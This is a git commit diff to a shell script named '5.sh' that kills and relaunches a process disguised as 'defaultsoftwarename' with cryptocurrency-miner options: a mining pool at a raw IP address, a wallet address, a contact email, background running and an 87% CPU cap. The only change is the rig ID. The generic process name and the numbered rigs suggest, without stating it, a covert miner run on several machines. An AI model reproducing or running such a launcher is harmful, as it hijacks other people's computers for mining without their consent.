bf6f32e8190f7e77910a4898beaaf64d17e2106a
googl5 <65433622+googl5@users.noreply.github.com>
2020-05-19 22:21:42 +0300

    Update 5.sh

--- 5.sh
+++ 5.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o 45.134.254.83:29863 -u 85p5pDbnrxkag96ZC646M1Ev9iY9tQWjA8Aq9y5WD5E6guVjmQt9AfGDhEVszYLYVeNdmYeJSLnVTCKuwC1cSJUBUvcnPNY --pass=x:merkor233@yandex.com --rig-id=02 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=87 --av=1
+defaultsoftwarename -o 45.134.254.83:29863 -u 85p5pDbnrxkag96ZC646M1Ev9iY9tQWjA8Aq9y5WD5E6guVjmQt9AfGDhEVszYLYVeNdmYeJSLnVTCKuwC1cSJUBUvcnPNY --pass=x:merkor233@yandex.com --rig-id=04 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=87 --av=1
